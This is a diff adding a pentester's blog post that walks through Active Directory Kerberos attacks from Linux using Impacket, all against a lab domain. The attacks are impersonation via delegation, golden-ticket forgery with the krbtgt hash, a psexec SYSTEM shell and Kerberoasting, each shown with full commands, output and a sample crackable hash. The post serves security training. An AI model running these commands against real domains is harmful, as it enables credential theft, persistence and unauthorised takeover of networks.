@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>(Ab)using Kerberos from Linux // Calum Boal</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.62.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://calumboal.com/css/main.min.59023e5fd38d6ecb0e1dfbb295077c3c67e00e3b9eb3feaf34b5a5e6b332897a.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="(Ab)using Kerberos from Linux"/>
+<meta name="twitter:description" content="(Ab)using Kerberos from Linux This post aims to provide an overview of tooling available to perform common Kerberos abuse techniques from Linux. While this blog will not go into great detail about how the attacks which utilize these techniques work, references will be provided to high quality blog posts detailing common Kerberos attacks.
+Kerberos Overview Before we jump into it, a brief preface shall be provided regarding the function of Kerberos within Active Directory, and why it&#39;s beneficial to be fluent in Kerberos manipulation when performing penetration tests."/>
+
+    <meta property="og:title" content="(Ab)using Kerberos from Linux" />
+<meta property="og:description" content="(Ab)using Kerberos from Linux This post aims to provide an overview of tooling available to perform common Kerberos abuse techniques from Linux. While this blog will not go into great detail about how the attacks which utilize these techniques work, references will be provided to high quality blog posts detailing common Kerberos attacks.
+Kerberos Overview Before we jump into it, a brief preface shall be provided regarding the function of Kerberos within Active Directory, and why it&#39;s beneficial to be fluent in Kerberos manipulation when performing penetration tests." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://calumboal.com/posts/abusing-kerberos/" />
+<meta property="article:published_time" content="2019-01-26T16:32:56+01:00" />
+<meta property="article:modified_time" content="2019-01-26T16:32:56+01:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://calumboal.com/"><img class="app-header-avatar" src="/img/avatar.png" alt="John Doe" /></a>
+      <h1>Calum Boal</h1>
+      <div style="display: inline-block">
+	 <script src="https://www.hackthebox.eu/badge/6894"></script>
+     </div>
+      <p>Pwning networks for OnSecurity. | OSCP | CRT |</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/cgboal"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/@CalumBoal"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+      <br>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">(Ab)using Kerberos from Linux</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 26, 2019
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          11 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <h1 id="abusing-kerberos-from-linux">(Ab)using Kerberos from Linux</h1>
+<p>This post aims to provide an overview of tooling available to perform common Kerberos abuse techniques from Linux. While this blog will not go into great detail about how the attacks which utilize these techniques work, references will be provided to high quality blog posts detailing common Kerberos attacks.</p>
+<h3 id="kerberos-overview">Kerberos Overview</h3>
+<p>Before we jump into it, a brief preface shall be provided regarding the function of Kerberos within Active Directory, and why it's beneficial to be fluent in Kerberos manipulation when performing penetration tests.</p>
+<p>Kerberos was first created at MIT, and was later released as an open-source project towards the end of the 1980's. Kerberos aimed to solve the problem of allowing users to authenticate with a multitude of service deployed accross many hosts, without the need to make the services themselves aware of the users individual credentials prior to authentication.</p>
+<p>MIT attempts to solve this problem by utilizing a centralized authentication daemon, which allows users to authenticate with the Kerberos service, and request tickets to access services existing outwith the context of the Kerberos service itself. These tickets would contain information identifying the user who requested the ticket, and would also <em>be encrypted with the password of the service acocunt</em>.</p>
+<p>Once the user has recieved the requested ticket, they send it on to the service (principals) they wish to access. As the ticket is encrypted by the Kerberos service using the password of the requested service, the recieving service can <em>verify the authenticity of the ticket by sucessfully decrypting the ticket</em>. Once decrypted, the recieving service can verify that the identifying information within the decrypted ticket <em>matches that of the user who sent the ticket</em>.</p>
+<p>In order to prevent users from having to manually authenticate with the Kerberos service every time they wish to access another service, the Kerberos service issues a ticket to the user for the Kerberos service itself. The ticket obtained from this process is known as a ticket-granting ticket (TGT). The TGT is then used in-place of the users credentials when requesting tickets for other services from the Kerberos service. It is important to note that as tickets are encrypted with the password of the service they are valid for, TGT's are encrypted with the password of the Kerberos service itself (in AD, this is the krbtgt user's NTLM hash).</p>
+<p>Obviously the above is a great oversimplification of Kerberos version 4+, however, it conveys the core idea behind Kerberos, without going into much of the complexity which was added to mitigate certain weaknesses. To read more about how Kerberos functions, I would reccomend checking out the <a href="https://web.mit.edu/kerberos/dialogue.html">dialogue released</a> by MIT regarding the design of Kerberos. Having read a number of explanations of Kerberos, the MIT dialogue was the first to make Kerberos click for me in a substantial, yet slightly cringe fashion.</p>
+<p>Within Active Directory environments Kerberos, which can be found on port 88/TCP of Domain Controllers, allows users to authenticate with services such as CIFS (SMB shares), LDAP, Databases, etc. Additional Service Principal Names (SPN's) can also be created for other services which may be accessed using Kerberos authentication.</p>
+<h3 id="why-do-we-need-to-use-kerberos">Why do we need to use Kerberos?</h3>
+<p>Now, you might be thinking that since you need a users credentials (NTLM hash) to request a Kerberos ticket within Active Directory you might as well just use the credentials instead of tickets to authenticate with services such as SMB or LDAP. To a degree, you'd be correct in this assertion, using recovered credentials typically is easier than using tickets, however, tickets afford you certain benefits beyond those available by simply using credetials; namely:</p>
+<ul>
+<li>Some services do not allow direct logon via NTLM authentication, and may requrie tickets</li>
+<li>Kerberos is required to abuse constrained/unconstrained delegation permissions</li>
+<li>Even if the users credentials are changed, the ticket will remain valid (until it expires)</li>
+<li>Golden tickets can be forged which essentially never expire, and can be used to persist access to services</li>
+<li>Tickets can also be forged which allow pivoting between domains in a forest with a trust relationship</li>
+<li>Kerberoasting attacks can often yeild high-privileged credentials</li>
+<li>etc</li>
+</ul>
+<h2 id="working-with-tickets">Working with tickets</h2>
+<h3 id="requesting-tickets">Requesting tickets</h3>
+<p>Now, onto the good stuff. First things first, we should know how to retrieve tickets for the services we wish to access. Tickets can be easily requested using <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>&lsquo;s <code>getST.py</code> (get silver ticket) script. If <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> is installed properly, <code>getST.py</code> should be on your <code>$PATH</code>, if not, <code>getST.py</code> along with the other <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> scripts mentioned throughout this blog can be found in the <code>examples</code> folder of the <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> repository.</p>
+<p>Below is an example of the syntax used to request a ticket for the user <code>jane.adams</code> of the <code>veldt.com</code> domain, for the <code>cifs</code> (SMB) service (Principal) on the host <code>DC01.VELDT.COM</code>. The combinaton of the service (principal), and the host on which the service resides is reffered to as the Service Principal Name (SPN).</p>
+<pre><code>[h4x0r@mainframe ~]$ getST.py -dc-ip 192.168.100.5 -spn cifs/DC01.VELDT.COM 'VELDT.COM/jane.adams:Password_goes_here' 
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Getting ST for user
+[*] Saving ticket in jane.adams.ccache
+</code></pre><h3 id="using-tickets">Using tickets</h3>
+<p>In the above example, it is stated that the ticket has been saved to <code>jane.adams.ccache</code>. In order to inform other impacket tools of where they can find the ticket to use, the <code>KRB5CCNAME</code> environment variable is set as follows:</p>
+<pre><code>[h4x0r@mainframe ~]$ export KRB5CCNAME=jane.adams.ccache 
+</code></pre><p>With the <code>KRB5CCNAME</code> environment variable now set, we can use the obtained ticket to authenticate as the previously specified user against the previously specified service.</p>
+<p>Before we can successfully authenticate, we must make sure that we attempt to authenticate using information identical to that which was used when requesting the ticket. For example, we must refer to the target host by it's fully qualified domain name when specifying the target (<code>jane.adams@dc01.veldt.com</code>). If DNS is not correctly configured for the internal domain in use, it possible to verbosely state the IP address of the target (<code>-target-ip</code>) and domain controller (<code>-dc-ip</code>). In many instances the errors you encounter when trying to use Kerberos tickets from Linux will occur due to inconsistencies between information supplied when requesting, and using tickets.</p>
+<p>In the example below, we use the previously retrieved Kerberos ticket to connect to <code>DC01</code> using <code>Impacket</code>'s <code>smbclient.py</code> script. Note the usage of <code>-k</code>, which specifies that Kerberos authentication should be used:</p>
+<pre><code>[h4x0r@mainframe ~]$ smbclient.py jane.adams@DC01.VELDT.COM -k -no-pass
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SYSVOL
+# 
+</code></pre><h2 id="impersonation-tickets">Impersonation tickets</h2>
+<p>If you're lucky, you may find youself in a situation where you've compromised a host or account, with some form of delegation rights configured (constrained or unconstrained). Thus, allowing you to request Kerberos tickets which can be used to impersonate arbitrary users when authenticating with against certain SPN's (depending on the delegation configuration).</p>
+<p>I won't go into detail regarding the delegation process as it's rather complex, however, I will refer you to the following resources which cover abusing delegation in depth:</p>
+<ul>
+<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog</a></li>
+<li><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">S4U2Pwnage</a></li>
+<li><a href="https://adsecurity.org/?p=1667">ADSecurity's blog</a></li>
+</ul>
+<p>In order to request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets <code>getST.py</code> script, however, this time passing the <code>-impersonate</code> flag and specifying the user we wish to impersonate (any valid username):</p>
+<pre><code>[h4x0r@mainframe ~]$ getST.py -spn HOST/SQL01.VELDT.COM 'VELDT.COM/IIS.Admin:Password_Goes_here' -impersonate Administrator -dc-ip 192.168.100.5
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+</code></pre><p>Note that in the above example the supplied SPN must match one of the SPN's the supplied account is authorized to perform delegation against.</p>
+<h2 id="golden-tickets">Golden tickets</h2>
+<p>Who doesn't love getting a Golden Ticket? I know I do, and what's more, I love having the ability to create one without having to mess about with Mimikatz or other Windows tooling which is bound to get flagged by AV at some point in your pen-testing endevours. That's why we're covering requesting Golden Tickets using the tools available within <code>Impacket</code> (i'm sure you're noticing a pattern here).</p>
+<p>Now for those of you who are unaware of the concept of Golden Tickets, I shall provide a brief overview. Remember at the start of this blog when I described the need for Ticket Granting Tickets, and highlighted the importance of the fact they are encrypted with the <code>krbtgt</code> users NTLM hash? Well, the reason was that this is the crux of Golden Ticket forgery. If we have access to the NTLM hash of the <code>krbtgt</code> user (i.e. dumped it from a Domain Controller), we can forge ourselves Ticket Granting Tickets for <code>SID</code> we like, and encrypt it with the NTLM hash of the <code>krbtgt</code> user to cement it's authenticity.</p>
+<p>You may wonder what the point of forging a Golden Ticket is if you already have the level of access required to dump NTLM hashes from a Domain Controller, and that's understandable. Thus, the following list highlights the benefits of using Golden Tickets during engagements:</p>
+<ul>
+<li>Golden tickets can be used to escelate privileges between two domains with configured trust relationsips (see <a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/">here</a>, <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">here</a>, and <a href="https://adsecurity.org/?p=1640">here</a>)</li>
+<li>Golden Tickets will remain valid even if a users password expires, or is changed</li>
+<li>The only way to invalidate a Golden Ticket is to change the <code>krbtgt</code> users password twice</li>
+</ul>
+<p>So, what do we need to forge Golden Tickets? As previously mentioned we need:</p>
+<ul>
+<li>NTLM hash of <code>krbtgt</code> user</li>
+<li>SID of target Domain</li>
+</ul>
+<p>We'll assume you already have the NTLM hash of the <code>krbtgt</code> user, and just skip straight to obtaining the <code>SIDs</code>. To retrieve the target Domains <code>SID</code>, the script <code>lookupsid.py</code> from <code>Impacket</code> can be used as follows, with the target host being the Domain Controller:</p>
+<pre><code>[h4x0r@mainframe ~]$ lookupsid.py veldt.com/jane.adams:Password_Goes_here@192.168.100.5
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Brute forcing SIDs at 192.168.100.5
+[*] StringBinding ncacn_np:192.168.100.5[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-3698971782-1394112190-1761101054
+498: VELDT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: VELDT\Administrator (SidTypeUser)
+501: VELDT\Guest (SidTypeUser)
+502: VELDT\krbtgt (SidTypeUser)
+512: VELDT\Domain Admins (SidTypeGroup)
+513: VELDT\Domain Users (SidTypeGroup)
+514: VELDT\Domain Guests (SidTypeGroup)
+515: VELDT\Domain Computers (SidTypeGroup)
+516: VELDT\Domain Controllers (SidTypeGroup)
+517: VELDT\Cert Publishers (SidTypeAlias)
+518: VELDT\Schema Admins (SidTypeGroup)
+519: VELDT\Enterprise Admins (SidTypeGroup)
+520: VELDT\Group Policy Creator Owners (SidTypeGroup)
+</code></pre><p>With the domain SID retrieved from the above command output <code>S-1-5-21-3698971782-1394112190-1761101054</code>, we can now use <code>ticketer.py</code> from <code>Impacket</code> to request a Golden Ticket. As Kerberos works with <code>SIDs</code> and not <code>SAM</code> usernames, the supplied username can be anything we like, even if the user does not exist. By default, the forged ticket will contain <code>SIDs</code> for the following groups (which can be referenced against the above output) - 513, 512, 520, 518, 519. However, an alternative list of groups can be specified using <code>-groups</code>. Finally, additional Domain <code>SIDs</code> can be specified using the <code>-extra-sid</code> flag, which is useful for pivoting across domain trusts.</p>
+<pre><code>[h4x0r@mainframe ~]$ ticketer.py -nthash $NT_HASH_ONLY -domain-sid  S-1-5-21-3698971782-1394112190-1761101054 -domain VELDT.COM h4x0r
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for VELDT.COM/h4x0r
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in h4x0r.ccache
+</code></pre><p>We can then set the <code>KRB5CCNAME</code> environment variable as previously described:</p>
+<pre><code>[h4x0r@mainframe ~]$ export KRB5CCNAME=h4x0r.ccache
+</code></pre><p>And then use <code>Impackets</code> <code>psexec.py</code> script to pop a shell as the non-existent user <code>h4x0r</code>, on any host in the Domain for which the <code>SID</code> was provided:</p>
+<pre><code>[h4x0r@mainframe ~]$ psexec.py VELDT.COM/h4x0r@SQL01.VELDT.COM -k -no-pass -dc-ip 192.168.100.5 -target-ip 192.168.100.16
+
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.100.16.....
+[*] Found writable share ADMIN$
+[*] Uploading file PBZpOwXM.exe
+[*] Opening SVCManager on 192.168.100.16.....
+[*] Creating service wssq on 192.168.100.16.....
+[*] Starting service wssq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre><h2 id="kerberoasting">Kerberoasting</h2>
+<p>Ah Kerberoasting, what's not to love? If that question is not percieved as rhetorical, i'll provide a brief explanation of why it should be.</p>
+<p>In short, SPN's in Active Directory are often tied to user accounts (as opposed to machine accounts) in order to allow services such as Databases or Web Servers to access resources based upon permissions configured for Active Directory users. Now, as we've mentioned, Kerberos tickets are encrypted with the NTLM hash of the SPN for which they are requested. Furthermore, the plaintext of the Kerberos ticket is known to the entity which requests it. As a result, it is possible to request Kerberos tickets for services which are configured with SPN's tied to user accounts, and perform a brute-force attack to figure out what password was used to encrypt the ticket.</p>
+<p>In many instances, such as the one below, SPN's will be tied to high-privilege (or more commonly over-privileged) Active Directory accounts. Typically this is due to SPN's being automatically configured by applications to have Administrative permissions, or system administrators deplyoing services where the required permissions are unknown so they just give the service Administrator permissions.</p>
+<p>Below is an example of performing a Kerberoasting attack using <code>Impackets</code> <code>GetUserSPNs.py</code> script. The resulting Kerberos TGS's can be cracked using either John The Ripper, or Hashcat (mode 13100).</p>
+<pre><code>[h4x0r@mainframe ~]$ GetUserSPNs.py -dc-ip 192.168.100.5 'VELDT.COM/jane.adams:Password_goes_here'  -request          
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+ServicePrincipalName  Name       MemberOf  PasswordLastSet             LastLogon                  
+--------------------  ---------  --------  --------------------------  --------------------------
+HTTP/IIS01.VELDT.COM  IIS.Admin            2020-01-26 19:55:02.893201  2020-01-26 21:18:16.328180 
+
+$krb5tgs$23$*IIS.Admin$VELDT.COM$HTTP/IIS01.VELDT.COM*$9ae7773caec31e3e4ce94afa33313e93$73272e7bb959ba7bc8cc12088b81419ee70dce471c50e1a627fdca67f519d55da30a584c2215c6f4a0a998171707131df775e9e746037792e25baf926746d8d739f985781aba3ca064a86980f4ec147776b5f31ab960a06d887ead795d778528e28814f36bc277ec97f0fa3b9eb6b26531f91a2c376c6364346c790c2bca845ec48167321ba0175613594e1d5aebf454d64b6c739e590865f880d5f366a05cf0b98cdfc6a89705c8aaa4d23744278ec348139fca7deb3b3511f80bd434f4c60a2fc63a40eb3037dec2d681a861ef9b48997f285ab2ff161c89b04d00dffb8eefe38e1cebd513580a565dbf55c979ed872b63271d3f1ad4ef0561dfafd17235197d17da5d1e120d9ec582a4e37dc6bac93d8f2de54a3ff1e4f5cd4f70b8adc39581af608a6a5429e8ddd33d
+...snipped...
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>Hopefully this post has provided a decent overview of (ab)using Kerberos from Linux, and also demonstrated the reasons why you should do so.</p>
+<p>If you'd like to play about with some of these techniques in a controlled environment, then i'd highly reccomend the Offshore prolab on hackthebox, or building your own AD lab as I did while writing this blog.</p>
+<p>If you have any questions about Kerberos, lab building, or anything really feel free to give me a message on Twitter (<a href="https://twitter.com/CalumBoal">@cgboal</a>), or drop me an email at <a href="mail://calum.boal@onsecurity.co.uk">calum.boal@onsecuriy.co.uk</a>.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
